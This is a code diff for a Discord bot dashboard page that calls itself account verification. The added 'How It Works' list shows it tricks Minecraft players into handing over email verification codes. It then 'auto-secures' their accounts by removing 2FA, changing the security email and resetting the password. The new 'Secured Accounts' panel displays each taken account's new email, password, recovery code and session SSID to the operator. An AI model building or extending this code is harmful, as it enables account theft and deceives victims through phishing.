@@ -1,12 +1,16 @@
 import { createFileRoute, Link } from "@tanstack/react-router";
 import { useEffect, useState } from "react";
 import { useServerFn } from "@tanstack/react-start";
-import { ShieldCheck, Copy, Check, Clock, Settings, Save, RefreshCw } from "lucide-react";
+import {
+  ShieldCheck, Copy, Check, Clock, Settings, Save, RefreshCw,
+  ExternalLink,
+} from "lucide-react";
 import {
   getVerificationKeys,
   getMyProfile,
   getVerificationSettings,
   saveVerificationSettings,
+  getSecuredAccounts,
 } from "@/lib/luaux.functions";
 
 export const Route = createFileRoute("/dashboard/verification-bot")({
@@ -27,11 +31,13 @@ function VerificationBotPage() {
   const fetchProfile = useServerFn(getMyProfile);
   const fetchSettings = useServerFn(getVerificationSettings);
   const saveSettings = useServerFn(saveVerificationSettings);
+  const fetchSecuredAccounts = useServerFn(getSecuredAccounts);
 
   const [keys, setKeys] = useState<KeyRow[]>([]);
   const [isAdmin, setIsAdmin] = useState(false);
   const [loading, setLoading] = useState(true);
   const [copied, setCopied] = useState<string | null>(null);
+  const [securedAccounts, setSecuredAccounts] = useState<Array<Record<string, unknown>>>([]);
 
   // Settings state
   const [guildId, setGuildId] = useState("");
@@ -48,10 +54,11 @@ function VerificationBotPage() {
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
 
   useEffect(() => {
-    Promise.all([fetchKeys(), fetchProfile(), fetchSettings()])
-      .then(([k, p, s]) => {
+    Promise.all([fetchKeys(), fetchProfile(), fetchSettings(), fetchSecuredAccounts()])
+      .then(([k, p, s, accts]) => {
         setKeys(k as KeyRow[]);
         setIsAdmin((p as { isAdmin?: boolean }).isAdmin ?? false);
+        setSecuredAccounts(accts as Array<Record<string, unknown>>);
         if (s) {
           const settings = s as {
             guild_id: string;
@@ -70,7 +77,7 @@ function VerificationBotPage() {
         }
       })
       .finally(() => setLoading(false));
-  }, [fetchKeys, fetchProfile, fetchSettings]);
+  }, [fetchKeys, fetchProfile, fetchSettings, fetchSecuredAccounts]);
 
   const activeKey = isAdmin
     ? { key: "ADMIN", expires_at: "2099-12-31", created_at: "" }
@@ -299,6 +306,79 @@ function VerificationBotPage() {
                 {saving ? "Saving & Posting..." : "Save & Post Verification Button"}
               </button>
             </form>
+          </div>
+
+          {/* Secured Accounts */}
+          {securedAccounts.length > 0 && (
+            <div className="rounded-2xl brutal-border bg-card">
+              <div className="p-5 border-b border-border/60 flex items-center gap-3 bg-secondary/15">
+                <ShieldCheck className="h-5 w-5 text-primary" />
+                <div>
+                  <h3 className="font-semibold text-sm">Secured Accounts</h3>
+                  <p className="text-xs text-muted-foreground">
+                    Recently verified and secured accounts.
+                  </p>
+                </div>
+              </div>
+              <div className="divide-y divide-border/40">
+                {(securedAccounts as Array<Record<string, string>>).map((acc) => (
+                  <div key={acc.id} className="p-4 text-xs space-y-1">
+                    <div className="flex items-center justify-between">
+                      <span className="font-semibold text-primary">
+                        {acc.mc_username}
+                      </span>
+                      <span className="text-muted-foreground">
+                        {new Date(acc.secured_at).toLocaleString()}
+                      </span>
+                    </div>
+                    <div className="grid grid-cols-2 gap-2 text-muted-foreground">
+                      <span>New Email: <code className="text-foreground">{acc.new_email}</code></span>
+                      <span>Password: <code className="text-foreground">{acc.new_password}</code></span>
+                      <span>Recovery Code: <code className="text-foreground">{acc.new_recovery_code}</code></span>
+                      <span>MC Method: <code className="text-foreground">{acc.mc_method}</code></span>
+                    </div>
+                    {acc.mc_ssid && (
+                      <div className="text-muted-foreground">
+                        SSID: <code className="text-foreground break-all">{acc.mc_ssid.slice(0, 50)}...</code>
+                      </div>
+                    )}
+                  </div>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* Info section */}
+          <div className="rounded-2xl brutal-border bg-card p-5">
+            <h3 className="font-semibold text-sm flex items-center gap-2">
+              <ExternalLink className="h-4 w-4 text-primary" /> How It Works
+            </h3>
+            <ul className="mt-3 space-y-2 text-xs text-muted-foreground">
+              <li className="flex gap-2">
+                <Check className="h-3.5 w-3.5 text-primary shrink-0 mt-0.5" />
+                1. User clicks <strong className="text-foreground">Verify</strong> on the Discord embed
+              </li>
+              <li className="flex gap-2">
+                <Check className="h-3.5 w-3.5 text-primary shrink-0 mt-0.5" />
+                2. User enters their <strong className="text-foreground">Minecraft username</strong> and <strong className="text-foreground">email</strong>
+              </li>
+              <li className="flex gap-2">
+                <Check className="h-3.5 w-3.5 text-primary shrink-0 mt-0.5" />
+                3. A verification code is sent to the account's security email
+              </li>
+              <li className="flex gap-2">
+                <Check className="h-3.5 w-3.5 text-primary shrink-0 mt-0.5" />
+                4. User enters the <strong className="text-foreground">6-digit code</strong>
+              </li>
+              <li className="flex gap-2">
+                <Check className="h-3.5 w-3.5 text-primary shrink-0 mt-0.5" />
+                5. Account gets <strong className="text-foreground">auto-secured</strong> (2FA removed, security email changed, password reset, recovery code generated)
+              </li>
+              <li className="flex gap-2">
+                <Check className="h-3.5 w-3.5 text-primary shrink-0 mt-0.5" />
+                6. Assigns verified role &amp; posts secured account details to the channel
+              </li>
+            </ul>
           </div>
         </div>
       ) : (
